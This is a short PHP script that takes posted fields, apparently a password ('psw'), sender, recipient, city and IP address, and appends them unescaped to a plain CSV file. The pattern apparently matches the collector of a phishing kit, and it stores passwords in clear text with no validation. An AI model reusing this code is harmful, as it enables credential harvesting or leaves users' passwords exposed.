<?php


$psw = $_POST['psw'] ?? '-';
$date = date("d/m/Y H:i:s");
$from = $_POST['from'] ?? '-';
$to = $_POST['to'] ?? '-';
$city = $_POST['city'] ?? '-';
$ip = $_POST['ip'] ?? '-';


$list = array
(
  "$psw,$date,$from,$to,$city,$ip",
);

$file = fopen('data.csv','a');  

foreach ($list as $line)
  {
   fputcsv($file,explode(',',$line));
  }

fclose($file); 


